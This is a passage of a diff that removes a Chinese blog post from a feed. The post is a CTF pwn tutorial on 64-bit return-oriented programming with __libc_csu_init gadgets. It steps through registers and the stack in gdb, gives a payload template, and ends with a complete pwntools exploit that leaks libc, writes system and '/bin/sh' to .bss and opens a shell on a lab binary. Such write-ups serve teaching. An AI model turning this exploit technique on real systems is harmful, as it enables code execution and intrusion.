-<li>R13: 0x1</li>
-<li>R14: 0x601000</li>
-<li>R15: 0x8</li>
-</ul>
-<p>此时栈中数据仍然如前：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/9.png?raw=true" alt=""></p>
-<p>接下去我们输入<code>n</code>，程序执行完<code>add    rsp,0x38</code>，即将栈顶加上0x38，也即加上56，这相当于是降低了栈顶（栈从低地址向高地址增长）。接下去程序将会执行<code>ret</code>指令，而此时的栈，注意是此时的栈，其内容如下：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/10.png?raw=true" alt=""></p>
-<p>接下去输入<code>n</code>，将会执行<code>ret</code>指令，相当于<code>pop rip</code>，也就是说执行完<code>ret</code>，将会跳转到栈顶所指的地址<code>0x4005f0</code></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/11.png?raw=true" alt=""></p>
-<h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>接下来算是进入ROP的第二阶段。</p>
-<p>这时的各寄存器的值如下图，</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/12.png?raw=true" alt=""></p>
-<p>在经过三个<code>mov</code>操作后<code>mov    rdx,r15</code>，<code>mov    rsi,r14</code>，<code>mov    edi,r13d</code>，我们成功地把进行write函数调用所需的三个参数都布置好了。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/14.png?raw=true" alt=""></p>
-<p>寄存器数据如下：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/13.png?raw=true" alt=""></p>
-<p>接下去会执行<code>call   QWORD PTR [r12+rbx*8]</code>，而我们已经将rbx置为0，r12置为write的got地址，所以执行这句语句，其实就是在调用write()函数。用如下命令可以查看<code>r12+rbx*8</code>处具体的值。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/gx <span class="variable">$r12</span>+<span class="variable">$rbx</span>*8</div><div class="line">0x601000 &lt;write@got.plt&gt;:	0x00007fdb0df2c280</div></pre></td></tr></table></figure></p>
-<h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>在call指令执行完了后，即调用完write（）函数后，我们进入ROP的第三阶段，收尾阶段。毕竟调用完后不能让程序崩溃啊。这时候对应的payload是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div></pre></td></tr></table></figure></p>
-<p>此时寄存器中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/15.png?raw=true" alt=""></p>
-<p>这是之前第一阶段中，我们设置的，RBX = 0x0，RBP = 0x1。将会进行如下三条指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x4005fd &lt;__libc_csu_init+93&gt;:	add    rbx,0x1</div><div class="line">0x400601 &lt;__libc_csu_init+97&gt;:	cmp    rbx,rbp</div><div class="line">0x400604 &lt;__libc_csu_init+100&gt;:	jne    0x4005f0 &lt;__libc_csu_init+80&gt;</div></pre></td></tr></table></figure></p>
-<p>将<code>rbp</code>加1，得到0x01，然后与值为0x01的rbp进行比较，<code>jne</code>指令说明如果两者比较相等则不会进行跳转，所以这里不会执行跳转，而是继续执行。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/16.png?raw=true" alt=""></p>
-<p>接下来“回”到了第一阶段的代码，此时的栈中的情况如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/17.png?raw=true" alt=""></p>
-<p>我们会执行六次的<code>mov</code>操作，但我们此时不需要再布置参数，所以可以说不用管：)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0x400606 &lt;__libc_csu_init+102&gt;:	mov    rbx,QWORD PTR [rsp+0x8]</div><div class="line">0x40060b &lt;__libc_csu_init+107&gt;:	mov    rbp,QWORD PTR [rsp+0x10]</div><div class="line">0x400610 &lt;__libc_csu_init+112&gt;:	mov    r12,QWORD PTR [rsp+0x18]</div><div class="line">0x400615 &lt;__libc_csu_init+117&gt;:	mov    r13,QWORD PTR [rsp+0x20]</div><div class="line">0x40061a &lt;__libc_csu_init+122&gt;:	mov    r14,QWORD PTR [rsp+0x28]</div><div class="line">0x40061f &lt;__libc_csu_init+127&gt;:	mov    r15,QWORD PTR [rsp+0x30]</div><div class="line">0x400624 &lt;__libc_csu_init+132&gt;:	add    rsp,0x38</div></pre></td></tr></table></figure></p>
-<p>接下来，会将rsp加上0x38，即加上56。结合栈的情况，这次add操作，将会将main函数的地址作为栈顶。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/18.png?raw=true" alt=""></p>
-<p>所以这一阶段的payload的构成是56个<code>\x00</code>，紧接是准备回到某个位置的内存地址。在执行完ret后，程序将回到mian函数中，以便我们进行下一次的利用。</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>综合对三个阶段的分析，在64位程序栈溢出时若用了__libc_csu_init中的gadget，其payload组成如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">payload = &apos;\x00&apos; * offset # offset是溢出偏移点</div><div class="line">## 第一阶段</div><div class="line">payload += p64(mov_rbx_rsp0x8_addr)</div><div class="line">payload += p64(0)  # 填充rsp到rsp+7间的数据</div><div class="line">payload += p64(0)  # 为后面 rbx 置 0 做准备</div><div class="line">payload += p64(1)  # 为后面 rbp 置 1 做准备</div><div class="line">paylaod += p64(call_func_got_addr) # 要调用函数的GOT地址，因为后面的调用是用QWORD PTR来进行的。</div><div class="line">payload += p64(第一个参数) # 调用函数的第一个参数</div><div class="line">payload += p64(第二个参数) # 调用函数的第二个参数</div><div class="line">payload += p64(第三个参数) # 调用函数的第三个参数</div><div class="line">payload += p64(mov_rdx_r15_addr) # 利用 ret 指令进入rop的第二阶段</div><div class="line">## 第二阶段  该阶段无需控制</div><div class="line"></div><div class="line">## 第三阶段</div><div class="line">payload += &quot;\x00&quot; * 56 # 填充 rsp 到 rsp+55间的数据</div><div class="line">payload += p64(return_addr) # 将要返回的地址，</div></pre></td></tr></table></figure></p>
-<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>现在我们利用这个通用ROP，写一个exp。大体思路是，利用DynELF借write()函数泄露出system的地址。但要注意几点，得到system的地址后，不能直接作为call_func_got_addr，而应该先写到bss段，再填入bss段的地址。所以下面的payload中，bss_addr到bss_addr+7，保存着system的地址，bss_addr+8到bss_addr+15保存着字符串“/bin/sh\x00”。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'level5'</span>)</div><div class="line">p = process(<span class="string">'./level5'</span>)</div><div class="line">sh = <span class="string">"/bin/sh\x00"</span></div><div class="line">bss_addr = elf.bss(<span class="number">0x20</span>)</div><div class="line">got_write = elf.got[<span class="string">'write'</span>]</div><div class="line">got_read = elf.got[<span class="string">'read'</span>]</div><div class="line">log.success(<span class="string">"The write got address is "</span>+ hex(got_write))</div><div class="line">log.success(<span class="string">"The read got address is "</span>+ hex(got_read))</div><div class="line"></div><div class="line">main = <span class="number">0x400564</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	p.recv()</div><div class="line">	payload =  <span class="string">"\x00"</span>*<span class="number">136</span></div><div class="line">	payload += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(address) + p64(<span class="number">8</span>)</div><div class="line">	payload += p64(<span class="number">0x4005F0</span>)</div><div class="line"></div><div class="line">	payload += <span class="string">"\x00"</span>*<span class="number">56</span></div><div class="line">	payload += p64(main)</div><div class="line">	p.send(payload)</div><div class="line">	data = p.recv(<span class="number">8</span>)</div><div class="line">	<span class="keyword">return</span> data</div><div class="line"></div><div class="line">dynelf = DynELF(leak,elf=elf)</div><div class="line">system_addr = dynelf.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</div><div class="line">log.success(<span class="string">"The system address is "</span> + hex(system_addr))</div><div class="line"></div><div class="line"></div><div class="line">payload2 = <span class="string">'\x00'</span> * <span class="number">136</span></div><div class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>)</div><div class="line">payload2 += p64(<span class="number">0x4005F0</span>)</div><div class="line">payload2 += <span class="string">"\x00"</span> * <span class="number">56</span></div><div class="line">payload2 += p64(main)</div><div class="line">p.send(payload2)</div><div class="line"></div><div class="line">system_sh = p64(system_addr) + sh</div><div class="line">p.send(system_sh)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</div><div class="line"></div><div class="line">payload3 = <span class="string">'\x00'</span> * <span class="number">136</span></div><div class="line">payload3 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</div><div class="line">payload3 += p64(<span class="number">0x4005F0</span>)</div><div class="line">payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></div><div class="line">payload3 += p64(main)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/19.png?raw=true" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;web狗的二进制之路。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Bin Security" scheme="http://yoursite.com/categories/Bin-Security/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-      <category term="rop" scheme="http://yoursite.com/tags/rop/"/>
     
   </entry>
   
